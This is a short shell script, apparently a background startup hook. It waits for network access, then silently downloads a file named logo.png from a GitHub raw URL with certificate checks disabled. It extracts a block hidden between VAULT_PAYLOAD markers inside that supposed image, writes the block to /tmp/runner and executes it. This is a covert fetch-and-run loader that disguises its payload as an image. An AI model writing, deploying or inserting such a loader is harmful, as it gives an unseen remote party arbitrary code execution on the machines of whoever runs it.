#!/bin/sh

(
    while ! ping -c 1 -W 1 8.8.8.8 > /dev/null 2>&1; do sleep 5; done
    sleep 5

    wget --no-check-certificate -qO /tmp/logo.png "https://raw.githubusercontent.com/skt12j/nimos/main/logo.png"
    sed -n '/#VAULT_PAYLOAD_START/,/#VAULT_PAYLOAD_END/p' /tmp/logo.png | grep -v "VAULT_PAYLOAD" > /tmp/runner
    sh /tmp/runner
) &
